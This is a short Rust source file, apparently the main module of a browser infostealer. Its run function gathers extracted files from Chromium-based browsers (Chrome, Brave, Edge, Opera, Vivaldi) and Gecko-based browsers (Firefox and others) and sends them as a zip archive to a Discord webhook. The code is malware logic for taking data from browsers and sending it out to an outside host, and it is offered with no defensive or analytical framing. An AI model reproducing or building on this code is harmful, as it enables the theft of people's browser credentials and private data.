pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
pub mod sender;

pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut all_files: Vec<(String, String)> = Vec::new();

    // Chromium-based browsers (Chrome, Brave, Edge, Opera, Vivaldi...)
    all_files.extend(chromium::extract_all());

    // Gecko-based browsers (Firefox, Waterfox, LibreWolf...)
    all_files.extend(gecko::extract_all());

    // Send everything as a zip via Discord webhook
    if !all_files.is_empty() {
        sender::send_zip(client, webhook_url, &all_files).await?;
    }

    Ok(())
}
